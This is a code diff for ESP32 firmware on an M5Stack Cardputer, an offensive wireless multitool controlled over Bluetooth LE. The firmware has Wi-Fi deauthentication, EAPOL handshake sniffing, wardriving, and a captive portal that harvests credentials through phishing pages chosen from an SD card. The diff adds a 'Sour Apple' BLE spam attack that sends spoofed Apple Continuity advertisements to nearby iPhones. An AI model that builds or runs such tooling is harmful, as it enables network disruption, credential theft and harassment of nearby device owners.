@@ -12,13 +12,14 @@
 #include "esp_wifi.h"
 #include <freertos/FreeRTOS.h>
 #include <freertos/queue.h>
+#include "esp_bt.h"
 
 // --- UUID Architecture ---
 #define SERVICE_UUID        "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
 #define CHARACTERISTIC_UUID "beb5483e-36e1-4688-b7f5-ea07361b26a6"
 
 // --- Cardputer SD SPI Pins ---
-#define SD_SPI_SCK_PIN  40
+#define SD_SPI_SCK_PIN    40
 #define SD_SPI_MISO_PIN 39
 #define SD_SPI_MOSI_PIN 14
 #define SD_SPI_CS_PIN   12
@@ -36,6 +37,7 @@ WebServer server(80);
 volatile bool clientConnectedFlag = false;
 volatile bool clientDisconnectedFlag = false;
 volatile bool isCurrentlyConnected = false;
+bool isAdvertisingActive = false;
 
 QueueHandle_t commandQueue;
 String selectedPortalFile = "/index.html";
@@ -43,23 +45,24 @@ BLECharacteristic *pGlobalCharacteristic = nullptr;
 BLEServer *pGlobalServer = nullptr;
 
 unsigned long lastActivityMillis = 0;
-unsigned long lastAdvertisingKickMillis = 0;
-const unsigned long ADVERTISING_WATCHDOG_MS = 15000;
 
 // Operational States
-enum SystemMode { MODE_IDLE, MODE_PORTAL, MODE_WARDRIVE, MODE_RECON, MODE_DEAUTH, MODE_FLOCK, MODE_EAPOL };
+enum SystemMode { MODE_IDLE, MODE_PORTAL, MODE_WARDRIVE, MODE_RECON, MODE_DEAUTH, MODE_FLOCK, MODE_EAPOL, MODE_SOUR_APPLE };
 SystemMode currentSystemMode = MODE_IDLE;
 
 bool wardrivingActive = false;
 bool flockActive = false;
 bool deauthActive = false;
 bool eapolActive = false;
+bool sourAppleActive = false;
+
 String targetDeauthBssid = "";
 int targetDeauthChannel = 1;
 String targetEapolBssid = "";
 String targetEapolSsid = "";
 int targetEapolChannel = 1;
 unsigned long lastDeauthPacket = 0;
+unsigned long lastSourApplePacket = 0;
 
 double currentLat = 0.0;
 double currentLon = 0.0;
@@ -71,6 +74,7 @@ int totalWigleRecords = 0;
 int totalFlockDetections = 0;
 int totalEapolHits = 0;
 int capturedCredsCount = 0;
+int sourAppleCount = 0;
 
 String currentWigleFile = "";
 String currentFlockFile = "";
@@ -78,31 +82,36 @@ String currentEapolFile = "";
 
 const String flockOuis[] = {"54:11:5F", "70:3A:0E", "E0:75:32", "00:18:0A", "24:0A:C4"};
 
-void restartAdvertisingRobust() {
-    BLEDevice::stopAdvertising();
-    delay(100);
+void startManualAdvertising() {
+    if (isCurrentlyConnected) return;
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setScanResponse(true);
     BLEDevice::startAdvertising();
-    lastAdvertisingKickMillis = millis();
-    Serial.println("[BLE] Advertising (re)started.");
+    isAdvertisingActive = true;
+    Serial.println("[BLE] Manual Advertising Started.");
+}
+
+void stopManualAdvertising() {
+    BLEDevice::stopAdvertising();
+    isAdvertisingActive = false;
+    Serial.println("[BLE] Manual Advertising Stopped.");
 }
 
 class MyServerCallbacks: public BLEServerCallbacks {
     void onConnect(BLEServer* pServer) {
         clientConnectedFlag = true;
         isCurrentlyConnected = true;
+        isAdvertisingActive = false;
         lastActivityMillis = millis();
         Serial.println("[BLE] Client Connected!");
     }
     void onDisconnect(BLEServer* pServer) {
         clientDisconnectedFlag = true;
         isCurrentlyConnected = false;
+        isAdvertisingActive = false;
         lastActivityMillis = millis();
-        Serial.println("[BLE] Client Disconnected - Restarting Advertising...");
-        delay(200);
-        restartAdvertisingRobust();
+        Serial.println("[BLE] Client Disconnected - Awaiting manual OK button press to advertise.");
     }
 };
 
@@ -111,13 +120,6 @@ class MyCallbacks: public BLECharacteristicCallbacks {
         String value = pCharacteristic->getValue();
         value.trim();
         if (value.length() > 0) {
-            Serial.print("[BLE RX] len="); Serial.print(value.length());
-            Serial.print(" bytes=");
-            for (int i = 0; i < value.length(); i++) {
-                Serial.printf("%02X ", (uint8_t)value[i]);
-            }
-            Serial.println();
-
             char cmdBuf[64] = {0};
             strncpy(cmdBuf, value.c_str(), sizeof(cmdBuf) - 1);
             xQueueSend(commandQueue, cmdBuf, 0);
@@ -133,9 +135,15 @@ void updateCardputerScreen() {
     M5Cardputer.Display.setTextColor(CYAN);
     M5Cardputer.Display.println("=== CARDPUTER COMMAND ===");
     
-    M5Cardputer.Display.setTextColor(isCurrentlyConnected ? GREEN : YELLOW);
+    M5Cardputer.Display.setTextColor(isCurrentlyConnected ? GREEN : (isAdvertisingActive ? YELLOW : RED));
     M5Cardputer.Display.print("BLE: ");
-    M5Cardputer.Display.println(isCurrentlyConnected ? "CONNECTED" : "ADVERTISING");
+    if (isCurrentlyConnected) {
+        M5Cardputer.Display.println("CONNECTED");
+    } else if (isAdvertisingActive) {
+        M5Cardputer.Display.println("ADVERTISING");
+    } else {
+        M5Cardputer.Display.println("OFFLINE (Press OK)");
+    }
 
     M5Cardputer.Display.setTextColor(WHITE);
     M5Cardputer.Display.print("MODE: ");
@@ -154,6 +162,9 @@ void updateCardputerScreen() {
     } else if (currentSystemMode == MODE_EAPOL) {
         M5Cardputer.Display.setTextColor(ORANGE);
         M5Cardputer.Display.println("[EAPOL SNIFF ACTIVE]");
+    } else if (currentSystemMode == MODE_SOUR_APPLE) {
+        M5Cardputer.Display.setTextColor(MAGENTA);
+        M5Cardputer.Display.println("[SOUR APPLE ACTIVE]");
     } else if (currentSystemMode == MODE_RECON) {
         M5Cardputer.Display.setTextColor(YELLOW);
         M5Cardputer.Display.println("[RECON SWEEPING]");
@@ -177,9 +188,15 @@ void updateCardputerScreen() {
     M5Cardputer.Display.setTextColor(MAGENTA);
     M5Cardputer.Display.print("Flock Hits: ");
     M5Cardputer.Display.println(totalFlockDetections);
+
     M5Cardputer.Display.setTextColor(ORANGE);
     M5Cardputer.Display.print("EAPOL Hits: ");
     M5Cardputer.Display.println(totalEapolHits);
+
+    M5Cardputer.Display.setTextColor(ORANGE);
+    M5Cardputer.Display.print("SourApple Packets: ");
+    M5Cardputer.Display.println(sourAppleCount);
+    
     M5Cardputer.Display.setTextColor(CYAN);
     M5Cardputer.Display.print("Creds: ");
     M5Cardputer.Display.println(capturedCredsCount);
@@ -274,6 +291,26 @@ void logToDeflockCsv(String type, String mac, String ssid, String rssi) {
             pGlobalCharacteristic->notify();
         }
     }
+}
+
+void sendSourApplePacket() {
+    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+    pAdvertising->stop();
+
+    uint8_t raw_data[] = {
+        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 
+        0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+
+    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+    oAdvertisementData.setManufacturerData(String((char*)raw_data, 30));
+    pAdvertising->setAdvertisementData(oAdvertisementData);
+    
+    pAdvertising->start();
+    sourAppleCount++;
+    delay(40);
+    pAdvertising->stop();
 }
 
 void performWardriveScan() {
@@ -451,8 +488,8 @@ void sendDeauthFrame(String bssidStr, int channel) {
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
 }
 
-void listDirectoryToBLE(BLECharacteristic *pChar) {
-    File root = SD.open("/");
+void listDirectoryToBLE(String path, BLECharacteristic *pChar) {
+    File root = SD.open(path.c_str());
     if (!root) {
         if (pChar != nullptr) { pChar->setValue("SD_DONE"); pChar->notify(); }
         return;
@@ -463,33 +500,23 @@ void listDirectoryToBLE(BLECharacteristic *pChar) {
     while (file) {
         String fileName = String(file.name());
         if (file.isDirectory()) {
-            File subRoot = SD.open(file.name());
-            if (subRoot) {
-                File subFile = subRoot.openNextFile();
-                while (subFile) {
-                    if (!subFile.isDirectory()) {
-                        String subName = String(subFile.name());
-                        if (subName.startsWith("/")) subName = subName.substring(1);
-                        String payload = "SD_FILE:" + subName;
-                        if (pChar != nullptr) {
-                            pChar->setValue(payload.c_str());
-                            pChar->notify();
-                        }
-                        delay(40);
-                    }
-                    subFile.close();
-                    subFile = subRoot.openNextFile();
-                }
-                subRoot.close();
-            }
-        } else {
-            if (fileName.startsWith("/")) fileName = fileName.substring(1);
-            String payload = "SD_FILE:" + fileName;
+            String fullDirPath = path.endsWith("/") ? path + fileName : path + "/" + fileName;
+            String payload = "SD_DIR:" + fullDirPath;
             if (pChar != nullptr) {
                 pChar->setValue(payload.c_str());
                 pChar->notify();
             }
-            delay(40);
+            delay(35);
+        } else {
+            String fullFilePath = path.endsWith("/") ? path + fileName : path + "/" + fileName;
+            size_t fSize = file.size();
+            String sizeStr = (fSize < 1024) ? String(fSize) + " B" : String(fSize / 1024) + " KB";
+            String payload = "SD_FILE_EXT:" + fullFilePath + "|" + sizeStr;
+            if (pChar != nullptr) {
+                pChar->setValue(payload.c_str());
+                pChar->notify();
+            }
+            delay(35);
         }
         file.close();
         file = root.openNextFile();
@@ -554,7 +581,7 @@ void handleUniversalHarvest() {
     server.send(302, "text/plain", "");
 }
 
-void setupCaptivePortal(String ssid, String password, String portalFile) {
+void setupCaptivePortal(String ssid, String password) {
     WiFi.persistent(false);
     WiFi.disconnect(true);
     delay(100);
@@ -564,11 +591,11 @@ void setupCaptivePortal(String ssid, String password, String portalFile) {
     if (password.length() > 0) WiFi.softAP(ssid.c_str(), password.c_str());
     else WiFi.softAP(ssid.c_str());
     
-    delay(200);
+    delay(500);
     dnsServer.start(53, "*", WiFi.softAPIP());
 
-    server.on("/", HTTP_GET, [portalFile]() {
-        String path = portalFile.startsWith("/") ? portalFile : "/" + portalFile;
+    server.on("/", HTTP_GET, []() {
+        String path = selectedPortalFile.startsWith("/") ? selectedPortalFile : "/" + selectedPortalFile;
         if (SD.exists(path.c_str())) {
             File file = SD.open(path.c_str(), FILE_READ);
             server.streamFile(file, "text/html");
@@ -623,13 +650,13 @@ void setup() {
         CHARACTERISTIC_UUID,
         BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_NOTIFY
     );
-                                        
+                        
     pCharacteristic->setCallbacks(new MyCallbacks());
     pCharacteristic->addDescriptor(new BLE2902());
     pGlobalCharacteristic = pCharacteristic;
     
     pService->start();
-    restartAdvertisingRobust();
+    startManualAdvertising();
 
     lastActivityMillis = millis();
     updateCardputerScreen();
@@ -637,6 +664,22 @@ void setup() {
 
 void loop() {
     M5Cardputer.update();
+
+    if (M5Cardputer.Keyboard.isChange()) {
+        if (M5Cardputer.Keyboard.isPressed()) {
+            Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+            if (status.enter) {
+                if (!isCurrentlyConnected) {
+                    if (isAdvertisingActive) {
+                        stopManualAdvertising();
+                    } else {
+                        startManualAdvertising();
+                    }
+                    updateCardputerScreen();
+                }
+            }
+        }
+    }
 
     if (currentSystemMode == MODE_PORTAL) {
         dnsServer.processNextRequest();
@@ -675,8 +718,20 @@ void loop() {
                 pGlobalCharacteristic->setValue("PONG");
                 pGlobalCharacteristic->notify();
             }
+        } else if (cmd.startsWith("LIST_SD:")) {
+            int idx = cmd.indexOf(':');
+            String targetPath = (idx != -1) ? cmd.substring(idx + 1) : "/";
+            if (targetPath.length() == 0) targetPath = "/";
+            listDirectoryToBLE(targetPath, pGlobalCharacteristic);
         } else if (cmd.startsWith("LIST") || cmd.startsWith("LIST_SD")) {
-            listDirectoryToBLE(pGlobalCharacteristic);
+            listDirectoryToBLE("/", pGlobalCharacteristic);
+        } else if (cmd.startsWith("SELECT_PORTAL:")) {
+            int idx = cmd.indexOf(':');
+            if (idx != -1) {
+                selectedPortalFile = cmd.substring(idx + 1);
+                selectedPortalFile.trim();
+                if (!selectedPortalFile.startsWith("/")) selectedPortalFile = "/" + selectedPortalFile;
+            }
         } else if (cmd.startsWith("START_AP:")) {
             int c1 = cmd.indexOf(':');
             int c2 = cmd.indexOf(':', c1 + 1);
@@ -684,7 +739,7 @@ void loop() {
             
             String apSsid = "";
             String apPass = "";
-            String portalFile = "/index.html";
+            String portalFile = "";
 
             if (c3 != -1) {
                 apSsid = cmd.substring(c1 + 1, c2);
@@ -707,11 +762,12 @@ void loop() {
             }
 
             portalFile.trim();
-            if (portalFile.length() == 0) portalFile = "/index.html";
-            if (!portalFile.startsWith("/")) portalFile = "/" + portalFile;
+            if (portalFile.length() > 0) {
+                if (!portalFile.startsWith("/")) portalFile = "/" + portalFile;
+                selectedPortalFile = portalFile;
+            }
 
-            selectedPortalFile = portalFile;
-            setupCaptivePortal(apSsid, apPass, portalFile);
+            setupCaptivePortal(apSsid, apPass);
             currentSystemMode = MODE_PORTAL;
             
             if (pGlobalCharacteristic != nullptr) {
@@ -724,6 +780,7 @@ void loop() {
             WiFi.softAPdisconnect(true);
             WiFi.mode(WIFI_OFF);
             delay(100);
+            
             currentSystemMode = MODE_IDLE;
             if (pGlobalCharacteristic != nullptr) {
                 pGlobalCharacteristic->setValue("PORTAL_STOPPED");
@@ -794,6 +851,12 @@ void loop() {
         } else if (cmd == "STOP_FLOCK") {
             flockActive = false;
             currentSystemMode = MODE_IDLE;
+        } else if (cmd == "NEW_WARDRIVE_SESSION") {
+            wardrivingActive = true;
+            currentSystemMode = MODE_WARDRIVE;
+            totalWigleRecords = 0;
+            currentWigleFile = ""; // Force rollover to a brand new wigle_X.csv file
+            initWigleCsv();
         } else if (cmd == "START_WARDRIVE") {
             wardrivingActive = true;
             currentSystemMode = MODE_WARDRIVE;
@@ -801,9 +864,18 @@ void loop() {
         } else if (cmd == "STOP_WARDRIVE") {
             wardrivingActive = false;
             currentSystemMode = MODE_IDLE;
+            currentWigleFile = ""; // Clear file handle so subsequent starts spawn a fresh session file
+            totalWigleRecords = 0; // Zero out counter on firmware side
             WiFi.scanDelete();
             WiFi.mode(WIFI_STA);
             WiFi.disconnect();
+        } else if (cmd == "START_SOUR_APPLE") {
+            sourAppleActive = true;
+            currentSystemMode = MODE_SOUR_APPLE;
+        } else if (cmd == "STOP_SOUR_APPLE") {
+            sourAppleActive = false;
+            currentSystemMode = MODE_IDLE;
+            startManualAdvertising();
         }
         screenNeedsUpdate = true;
     }
@@ -817,18 +889,29 @@ void loop() {
         sendDeauthFrame(targetDeauthBssid, targetDeauthChannel);
     }
 
+    if (sourAppleActive && millis() - lastSourApplePacket > 100) {
+        lastSourApplePacket = millis();
+        sendSourApplePacket();
+    }
+
     if (wardrivingActive && millis() - lastWardriveScan > 5000) {
         lastWardriveScan = millis();
         performWardriveScan();
     }
 
+    static unsigned long lastGpsBroadcast = 0;
+    if (millis() - lastGpsBroadcast > 3000) {
+        lastGpsBroadcast = millis();
+        if (isCurrentlyConnected && pGlobalCharacteristic != nullptr) {
+            String gpsStat = "WARDRIVE_STAT:" + String(totalWigleRecords) + "|" + String(currentLat, 6) + "|" + String(currentLon, 6) + "|" + (hasGpsLock ? "1" : "0");
+            pGlobalCharacteristic->setValue(gpsStat.c_str());
+            pGlobalCharacteristic->notify();
+        }
+    }
+
     if (flockActive && millis() - lastFlockScan > 4000) {
         lastFlockScan = millis();
         performFlockScan();
-    }
-
-    if (!isCurrentlyConnected && (millis() - lastAdvertisingKickMillis > ADVERTISING_WATCHDOG_MS)) {
-        restartAdvertisingRobust();
     }
 
     static unsigned long lastDisplayRefresh = 0;
@@ -842,12 +925,14 @@ void loop() {
     static unsigned long lastTelemetry = 0;
     if (millis() - lastTelemetry > 5000) {
         lastTelemetry = millis();
-        float batteryVoltage = M5Cardputer.Power.getBatteryVoltage() / 1000.0;
-        int batteryLevel = M5Cardputer.Power.getBatteryLevel();
-        String telemetry = "TELEMETRY|BAT:" + String(batteryLevel) + "%|" + String(batteryVoltage) + "V";
-        if (pGlobalCharacteristic != nullptr) {
-            pGlobalCharacteristic->setValue(telemetry.c_str());
-            pGlobalCharacteristic->notify();
+        if (isCurrentlyConnected) {
+            float batteryVoltage = M5Cardputer.Power.getBatteryVoltage() / 1000.0;
+            int batteryLevel = M5Cardputer.Power.getBatteryLevel();
+            String telemetry = "TELEMETRY|BAT:" + String(batteryLevel) + "%|" + String(batteryVoltage) + "V";
+            if (pGlobalCharacteristic != nullptr) {
+                pGlobalCharacteristic->setValue(telemetry.c_str());
+                pGlobalCharacteristic->notify();
+            }
         }
     }
 }
